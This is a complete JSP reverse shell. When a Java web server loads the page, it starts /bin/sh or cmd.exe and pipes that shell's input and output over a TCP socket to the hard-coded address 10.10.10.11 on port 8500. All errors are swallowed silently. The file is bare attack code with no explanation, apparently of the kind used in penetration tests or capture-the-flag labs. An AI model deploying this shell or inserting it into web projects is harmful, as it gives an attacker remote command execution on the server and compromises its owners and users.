<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wb;
    OutputStream ds;

    StreamConnector( InputStream wb, OutputStream ds )
    {
      this.wb = wb;
      this.ds = ds;
    }

    public void run()
    {
      BufferedReader uh  = null;
      BufferedWriter snw = null;
      try
      {
        uh  = new BufferedReader( new InputStreamReader( this.wb ) );
        snw = new BufferedWriter( new OutputStreamWriter( this.ds ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = uh.read( buffer, 0, buffer.length ) ) > 0 )
        {
          snw.write( buffer, 0, length );
          snw.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( uh != null )
          uh.close();
        if( snw != null )
          snw.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.10.11", 8500 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
